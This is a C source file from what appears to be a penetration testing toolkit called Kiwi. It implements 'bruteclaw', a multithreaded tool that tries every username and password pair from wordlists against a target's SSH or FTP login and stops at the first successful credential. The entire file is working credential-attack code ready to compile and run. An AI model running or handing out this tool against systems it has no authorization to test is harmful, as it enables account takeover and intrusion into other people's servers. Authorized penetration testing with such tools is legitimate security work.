/*
 *  Kiwi - Penetration testing toolkit
 *
 * Copyright (C) 2025 NobleNomadic
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 */
#include "../../lib/sshlib.h"
#include "../../lib/ftplib.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define MAX_THREADS 12

// Struct to define the structure of a brute force attempt
typedef struct {
    char ip[64];
    char username[128];
    char password[128];
} BruteJob;

// SSH thread
void *SSHWorker(void *arg) {
    BruteJob *job = (BruteJob *)arg;

    SSHConnection *conn = sshConnect(job->ip, 22, job->username, job->password);
    if (conn) {
        printf("[+] Success: %s:%s\n", job->username, job->password);
        sshDisconnect(conn);
        exit(0); // Kill all on first success
    } else {
        // Failure somewhere in this thread, close the thread
        printf("[-] Failed: %s:%s\n", job->username, job->password);
        pthread_exit(NULL);
    }
}

// FTP worker
void *FTPWorker(void *arg) {
    BruteJob *job = (BruteJob *)arg;

    FTPConnection *conn = ftpConnect(job->ip, 21, job->username, job->password);
    if (conn) {
        printf("[+] Success: %s:%s\n", job->username, job->password);
        ftpDisconnect(conn);
        exit(0); // Kill all on first success
    } else {
        // Failure somewhere in this thread, close the thread
        printf("[-] Failed: %s:%s\n", job->username, job->password);
        pthread_exit(NULL);
    }
}

// Brute force SSH function
void bruteForceSSH(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
    printf("[*] Starting SSH brute force\n");

    FILE *usernameFile = fopen(usernameFilename, "r");
    FILE *passwordFile = fopen(passwordFilename, "r");

    if (!usernameFile || !passwordFile) {
        fprintf(stderr, "[-] Failed to open user or password file\n");
        return;
    }

    char currentUsername[128];
    pthread_t threads[MAX_THREADS];
    int threadIndex = 0;

    while (fgets(currentUsername, sizeof(currentUsername), usernameFile) != NULL) {
        strtok(currentUsername, "\n");

        rewind(passwordFile);
        char currentPassword[128];

        // Internal loop for each password
        while (fgets(currentPassword, sizeof(currentPassword), passwordFile) != NULL) {
            strtok(currentPassword, "\n");

            // setup job
            BruteJob *job = malloc(sizeof(BruteJob));
            strncpy(job->ip, targetIP, sizeof(job->ip));
            strncpy(job->username, currentUsername, sizeof(job->username));
            strncpy(job->password, currentPassword, sizeof(job->password));

            // launch thread
            pthread_create(&threads[threadIndex], NULL, SSHWorker, (void *)job);
            threadIndex++;

            // thread pool limiting
            if (threadIndex >= MAX_THREADS) {
                for (int i = 0; i < threadIndex; i++) {
                    pthread_join(threads[i], NULL);
                }
                threadIndex = 0;
            }
        }
    }

    // Wait for leftovers
    for (int i = 0; i < threadIndex; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(usernameFile);
    fclose(passwordFile);

    printf("[-] Brute complete, no creds found.\n");
}

// Main FTP brute force function
void bruteForceFTP(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
    printf("[*] Starting FTP brute force\n");

    FILE *usernameFile = fopen(usernameFilename, "r");
    FILE *passwordFile = fopen(passwordFilename, "r");

    if (!usernameFile || !passwordFile) {
        fprintf(stderr, "[-] Failed to open user or password file\n");
        return;
    }

    char currentUsername[128];
    pthread_t threads[MAX_THREADS];
    int threadIndex = 0;

    while (fgets(currentUsername, sizeof(currentUsername), usernameFile) != NULL) {
        strtok(currentUsername, "\n");

        rewind(passwordFile);
        char currentPassword[128];

        // Internal loop for each password
        while (fgets(currentPassword, sizeof(currentPassword), passwordFile) != NULL) {
            strtok(currentPassword, "\n");

            // setup job
            BruteJob *job = malloc(sizeof(BruteJob));
            strncpy(job->ip, targetIP, sizeof(job->ip));
            strncpy(job->username, currentUsername, sizeof(job->username));
            strncpy(job->password, currentPassword, sizeof(job->password));

            // launch thread
            pthread_create(&threads[threadIndex], NULL, FTPWorker, (void *)job);
            threadIndex++;

            // thread pool limiting
            if (threadIndex >= MAX_THREADS) {
                for (int i = 0; i < threadIndex; i++) {
                    pthread_join(threads[i], NULL);
                }
                threadIndex = 0;
            }
        }
    }

    // Wait for leftovers
    for (int i = 0; i < threadIndex; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(usernameFile);
    fclose(passwordFile);

    printf("[-] Brute complete, no creds found.\n");
}

// Entry point and argument handling
int main(int argc, char *argv[]) {
    printf("[*] Starting bruteclaw 1.0\n");

    if (argc < 5) {
        printf("Usage: ./bruteclaw <IP> <Username file> <Password file> <ssh|ftp>\n");
        return 1;
    }

    if (strcmp(argv[4], "ssh") == 0) {
        bruteForceSSH(argv[1], argv[2], argv[3]);
    } else if (strcmp(argv[4], "ftp") == 0) {
        bruteForceFTP(argv[1], argv[2], argv[3]);
    } else {
        printf("[-] Invalid protocol. Use 'ssh' or 'ftp'\n");
        return 1;
    }

    return 0;
}
